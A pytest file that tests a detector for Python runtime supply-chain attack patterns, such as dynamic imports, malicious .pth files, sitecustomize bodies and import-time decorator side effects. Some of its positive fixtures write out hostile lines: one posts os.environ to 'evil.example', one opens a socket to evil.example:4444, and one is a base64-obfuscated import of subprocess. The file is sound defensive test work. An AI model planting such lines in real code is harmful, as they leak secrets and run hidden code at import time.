"""Tests for ``scripts/lib/python_specific_patterns.py``.

Wave 17 impl-aa — verifies 8 Python-runtime attack-surface rules each
have a positive + (1-2) negative tests. Pure-stdlib pytest.

The rule catalogue covers the Python-runtime-side attack vectors that
the existing ``supply-chain-fingerprints.py`` detector does NOT touch:
``__import__`` with non-literal arg, ``importlib`` dynamic load,
``.pth`` files that exec at startup, ``sitecustomize.py`` /
``usercustomize.py`` presence, ``sys.path`` tainting, two-file lazy
dropper ``__init__.py`` chains, ``inspect.getsource``+``exec`` / dynamic
module fabrication, and decorator-argument import-time side effects.
"""

from __future__ import annotations

import re
import sys
from pathlib import Path

# Make ``scripts/lib`` importable without packaging — same trick used
# by every other ``test_*_patterns.py`` file in this repo.
_REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_REPO_ROOT / "scripts" / "lib"))

import python_specific_patterns as psp  # noqa: E402

# ---- Module-level invariants -------------------------------------------


def test_rules_have_unique_ids() -> None:
    """Every Rule.id is unique — duplicates would dedupe-collide."""
    ids = [r.id for r in psp.RULES]
    assert len(ids) == len(set(ids)), f"duplicate rule ids: {ids}"


def test_rules_have_compiled_patterns() -> None:
    """Every Rule.pattern is a compiled regex with MULTILINE flag.

    Note: unlike ``agent_config_patterns`` which uses IGNORECASE for
    natural-language prose, this module deliberately omits IGNORECASE
    because Python source is case-sensitive — ``Import`` is NOT
    ``import`` in Python parsing.
    """
    for rule in psp.RULES:
        assert isinstance(rule.pattern, re.Pattern), rule.id
        assert rule.pattern.flags & re.MULTILINE, rule.id


def test_rules_have_valid_severity() -> None:
    """Severity is one of the four canonical strings."""
    allowed = {"CRITICAL", "HIGH", "MEDIUM", "LOW"}
    for rule in psp.RULES:
        assert rule.severity in allowed, f"{rule.id}: {rule.severity}"


def test_rules_have_owasp_asi_mapping() -> None:
    """Every rule carries an OWASP-ASI mapping."""
    for rule in psp.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id


def test_scan_empty_returns_empty() -> None:
    """Empty input returns empty findings list."""
    assert psp.scan_text("") == []
    assert psp.scan_text("\n\n") == []


def test_rules_count_matches_proposals() -> None:
    """We implemented 8 of the 8 distill3-g proposals."""
    assert len(psp.RULES) == 8


def test_finding_namedtuple_shape() -> None:
    """Finding has the same 7 fields as agent_config_patterns.Finding."""
    f = psp.Finding(
        rule_id="x", line=1, column=1, matched_text="m",
        severity="HIGH", description="d", owasp_asi="ASI-06",
    )
    assert f.rule_id == "x"
    assert f.line == 1
    assert f.column == 1
    assert f.matched_text == "m"


def _hits(rule_id: str, text: str) -> list[psp.Finding]:
    """Return only findings of ``rule_id`` from ``scan_text(text)``.

    Used per-rule so other rule-co-firings (e.g. a ``.pth`` line that
    also matches the sitecustomize-body rule because both regexes
    happen to overlap on ``import subprocess``) don't confuse the
    per-rule assertions.
    """
    return [f for f in psp.scan_text(text) if f.rule_id == rule_id]


# ---- Rule 1: __import__ with non-literal first arg ---------------------


def test_dunder_import_nonliteral_variable_positive() -> None:
    """Variable name passed to ``__import__`` is flagged."""
    src = 'm = __import__(modname)'
    assert _hits("py-dunder-import-nonliteral", src)


def test_dunder_import_nonliteral_b64_decode_positive() -> None:
    """base64-decoded module name passed to ``__import__`` is flagged."""
    src = 'x = __import__(base64.b64decode(b"c3VicHJvY2Vzcw==").decode())'
    assert _hits("py-dunder-import-nonliteral", src)


def test_dunder_import_nonliteral_env_var_positive() -> None:
    """env-controlled module name passed to ``__import__`` is flagged."""
    src = 'm = __import__(os.environ["TARGET_MODULE"])'
    assert _hits("py-dunder-import-nonliteral", src)


def test_dunder_import_literal_double_quote_negative() -> None:
    """``__import__("subprocess")`` does NOT fire — literal is benign."""
    src = 'm = __import__("subprocess")'
    assert not _hits("py-dunder-import-nonliteral", src)


def test_dunder_import_literal_single_quote_negative() -> None:
    """``__import__('subprocess')`` does NOT fire."""
    src = "m = __import__('subprocess')"
    assert not _hits("py-dunder-import-nonliteral", src)


# ---- Rule 2: importlib dynamic load with non-literal arg ---------------


def test_importlib_import_module_nonliteral_positive() -> None:
    """``importlib.import_module(<expr>)`` non-literal arg is flagged."""
    src = 'mod = importlib.import_module(os.environ["X"])'
    assert _hits("py-importlib-dynamic-load-nonliteral", src)


def test_importlib_spec_from_file_tainted_path_positive() -> None:
    """``spec_from_file_location(literal, tainted_path)`` is flagged.

    The first arg can be a string literal (module name) but the path
    is the danger — covers the disclosed shape where the module name
    is hardcoded but the file path is downloaded at runtime.
    """
    src = 'spec = importlib.util.spec_from_file_location("name", downloaded_path)'
    assert _hits("py-importlib-dynamic-load-nonliteral", src)


def test_importlib_sourcefileloader_nonliteral_positive() -> None:
    """``SourceFileLoader("evil", get_path())`` is flagged."""
    src = 'loader = importlib.machinery.SourceFileLoader("evil", get_path())'
    assert _hits("py-importlib-dynamic-load-nonliteral", src)


def test_importlib_literal_only_negative() -> None:
    """``importlib.import_module("json")`` does NOT fire."""
    src = 'mod = importlib.import_module("json")'
    assert not _hits("py-importlib-dynamic-load-nonliteral", src)


def test_importlib_both_literals_negative() -> None:
    """``spec_from_file_location("n", "/etc/foo.py")`` does NOT fire."""
    src = 'spec = importlib.util.spec_from_file_location("name", "/etc/x.py")'
    assert not _hits("py-importlib-dynamic-load-nonliteral", src)


# ---- Rule 3: .pth file with import line --------------------------------


def test_pth_import_subprocess_positive() -> None:
    """``.pth`` line starting ``import`` is flagged."""
    src = 'import subprocess; subprocess.Popen(["evil"])'
    assert _hits("py-pth-file-import-line", src)


def test_pth_import_tab_positive() -> None:
    """Tab between ``import`` and module name is also flagged.

    The Python ``site.py`` docstring documents that BOTH ``import\\s``
    and ``import\\t`` are exec'd. Attackers may use tab to evade
    naive scanners that match ``import `` with a literal space.
    """
    src = 'import\tsubprocess'
    assert _hits("py-pth-file-import-line", src)


def test_pth_comment_negative() -> None:
    """Comment-prefixed ``import`` does NOT fire."""
    src = '# import subprocess'
    assert not _hits("py-pth-file-import-line", src)


def test_pth_relative_path_only_negative() -> None:
    """A normal relative path entry like ``../src`` does NOT fire."""
    src = '../src/foo\nlib/bar'
    assert not _hits("py-pth-file-import-line", src)


# ---- Rule 4: sitecustomize / usercustomize dangerous body --------------


def test_sitecustomize_subprocess_import_positive() -> None:
    """``import subprocess`` in a sitecustomize file fires."""
    src = 'import subprocess\nsubprocess.run(["evil"])'
    assert _hits("py-sitecustomize-dangerous-body", src)


def test_sitecustomize_from_socket_positive() -> None:
    """``from socket import socket`` fires."""
    src = 'from socket import socket'
    assert _hits("py-sitecustomize-dangerous-body", src)


def test_sitecustomize_eval_call_positive() -> None:
    """A top-level ``eval(`` call fires."""
    src = 'eval(payload)'
    assert _hits("py-sitecustomize-dangerous-body", src)


def test_sitecustomize_benign_sys_attr_negative() -> None:
    """A benign ``sys.dont_write_bytecode = True`` does NOT fire."""
    src = 'import sys\nsys.dont_write_bytecode = True'
    assert not _hits("py-sitecustomize-dangerous-body", src)


# ---- Rule 5: sys.path.insert / append from tainted path ----------------


def test_sys_path_parent_traversal_positive() -> None:
    """``sys.path.insert(0, "../evil/x")`` fires."""
    src = 'sys.path.insert(0, "../evil/x")'
    assert _hits("py-sys-path-insert-from-network", src)


def test_sys_path_tmp_writable_positive() -> None:
    """``sys.path.insert(0, "/tmp/x")`` fires (world-writable staging)."""
    src = 'sys.path.insert(0, "/tmp/x")'
    assert _hits("py-sys-path-insert-from-network", src)


def test_sys_path_os_environ_positive() -> None:
    """``sys.path.insert(0, os.environ["INJECT"])`` fires."""
    src = 'sys.path.insert(0, os.environ["INJECT"])'
    assert _hits("py-sys-path-insert-from-network", src)


def test_sys_path_subprocess_check_output_positive() -> None:
    """``sys.path.append(subprocess.check_output(...))`` fires."""
    src = 'sys.path.append(subprocess.check_output(["whoami"]).decode())'
    assert _hits("py-sys-path-insert-from-network", src)


def test_sys_path_legit_path_file_negative() -> None:
    """Standard ``str(Path(__file__).parent / "lib")`` does NOT fire."""
    src = 'sys.path.insert(0, str(Path(__file__).parent / "lib"))'
    assert not _hits("py-sys-path-insert-from-network", src)


def test_sys_path_legit_literal_negative() -> None:
    """A literal relative path like ``"lib"`` does NOT fire."""
    src = 'sys.path.insert(0, "lib")'
    assert not _hits("py-sys-path-insert-from-network", src)


# ---- Rule 6: __init__.py lazy `from . import X` ------------------------


def test_init_lazy_relative_import_positive() -> None:
    """``from . import _helper`` (caller routes only __init__.py)."""
    src = 'from . import _helper'
    assert _hits("py-init-py-lazy-relative-import", src)


def test_init_lazy_relative_import_named_positive() -> None:
    """``from . import api`` also fires."""
    src = 'from . import api'
    assert _hits("py-init-py-lazy-relative-import", src)


def test_init_absolute_import_negative() -> None:
    """Absolute import ``from mypkg import x`` does NOT fire."""
    src = 'from mypkg import _helper'
    assert not _hits("py-init-py-lazy-relative-import", src)


def test_init_no_import_negative() -> None:
    """A file with no imports does NOT fire."""
    src = 'x = 1\ny = 2'
    assert not _hits("py-init-py-lazy-relative-import", src)


# ---- Rule 7: reflection-based exec (getsource / ModuleType + exec) -----


def test_reflection_getsource_then_exec_positive() -> None:
    """``inspect.getsource`` followed by ``exec`` co-occurrence fires."""
    src = (
        'import inspect\n'
        'def _stub(): pass\n'
        'src = inspect.getsource(_stub)\n'
        'src = src.replace("pass", "subprocess.Popen([])")\n'
        'exec(src)'
    )
    assert _hits("py-reflection-exec-getsource-modtype", src)


def test_reflection_moduletype_then_exec_positive() -> None:
    """``types.ModuleType`` co-located with ``exec`` fires."""
    src = (
        'import types, sys\n'
        'm = types.ModuleType("fake_pkg")\n'
        'exec(_src, m.__dict__)\n'
        'sys.modules["fake_pkg"] = m'
    )
    assert _hits("py-reflection-exec-getsource-modtype", src)


def test_reflection_plain_exec_negative() -> None:
    """``exec(payload)`` alone (no getsource / ModuleType) does NOT fire."""
    src = 'exec(payload)'
    assert not _hits("py-reflection-exec-getsource-modtype", src)


def test_reflection_getsource_no_exec_negative() -> None:
    """``inspect.getsource`` alone (no exec) does NOT fire."""
    src = (
        'import inspect\n'
        'src = inspect.getsource(my_function)\n'
        'print(src)'
    )
    assert not _hits("py-reflection-exec-getsource-modtype", src)


# ---- Rule 8: decorator factory with dropper-shape argument -------------


def test_decorator_subprocess_run_arg_positive() -> None:
    """Decorator factory whose arg runs ``subprocess.run`` fires."""
    src = (
        '@register(subprocess.run(["whoami"], capture_output=True).stdout)\n'
        'def my_function(): pass'
    )
    assert _hits("py-decorator-import-time-side-effect", src)


def test_decorator_requests_post_arg_positive() -> None:
    """Decorator factory whose arg calls ``requests.post`` fires."""
    src = (
        '@register_to_server(requests.post("https://evil.example/", data=os.environ).text)\n'
        'def my_function(): pass'
    )
    assert _hits("py-decorator-import-time-side-effect", src)


def test_decorator_socket_create_connection_positive() -> None:
    """Decorator factory invoking ``socket.create_connection`` fires."""
    src = (
        '@register(socket.create_connection(("evil.example", 4444)).recv(1024))\n'
        'def my_function(): pass'
    )
    assert _hits("py-decorator-import-time-side-effect", src)


def test_decorator_click_command_negative() -> None:
    """Standard ``@click.command(name="foo")`` does NOT fire."""
    src = (
        '@click.command(name="foo")\n'
        'def my_function(): pass'
    )
    assert not _hits("py-decorator-import-time-side-effect", src)


def test_decorator_functools_cache_negative() -> None:
    """``@functools.cache`` (no factory call) does NOT fire."""
    src = (
        '@functools.cache\n'
        'def my_function(): pass'
    )
    assert not _hits("py-decorator-import-time-side-effect", src)


def test_decorator_flask_route_negative() -> None:
    """Standard ``@app.route("/path", methods=["GET"])`` does NOT fire."""
    src = (
        '@app.route("/path", methods=["GET"])\n'
        'def my_function(): pass'
    )
    assert not _hits("py-decorator-import-time-side-effect", src)


# ---- End-to-end scan_text composition ----------------------------------


def test_scan_text_returns_findings_sorted_by_line() -> None:
    """Findings are sorted by (line, column, rule_id)."""
    src = (
        'import sys\n'
        'sys.path.insert(0, "/tmp/x")\n'
        'm = __import__(modname)\n'
    )
    findings = psp.scan_text(src)
    # At least the two distinct rules fire on different lines
    assert any(f.rule_id == "py-sys-path-insert-from-network" for f in findings)
    assert any(f.rule_id == "py-dunder-import-nonliteral" for f in findings)
    # Findings must be ordered by line ascending
    lines = [f.line for f in findings]
    assert lines == sorted(lines)


def test_scan_text_deduplicates_same_rule_same_position() -> None:
    """A single rule firing at the same (line, col) twice emits once."""
    src = 'sys.path.insert(0, "/tmp/x")'
    findings = psp.scan_text(src)
    keys = [(f.rule_id, f.line, f.column) for f in findings]
    assert len(keys) == len(set(keys)), f"duplicate findings: {keys}"


def test_scan_text_truncates_long_matches_to_200_chars() -> None:
    """Matched text over 200 chars is truncated with an ellipsis."""
    # Build a synthetic long match — large decorator arg expression
    long_arg = "x" * 500
    src = f'@reg(subprocess.run([{long_arg!r}]))\ndef f(): pass'
    findings = psp.scan_text(src)
    target = [f for f in findings if f.rule_id == "py-decorator-import-time-side-effect"]
    if target:
        # The truncation rule kicks in at 200 chars; the match text is then 201 chars
        # (200 + the ellipsis "…" suffix).
        for f in target:
            if len(f.matched_text) > 200:
                assert f.matched_text.endswith("…"), repr(f.matched_text)
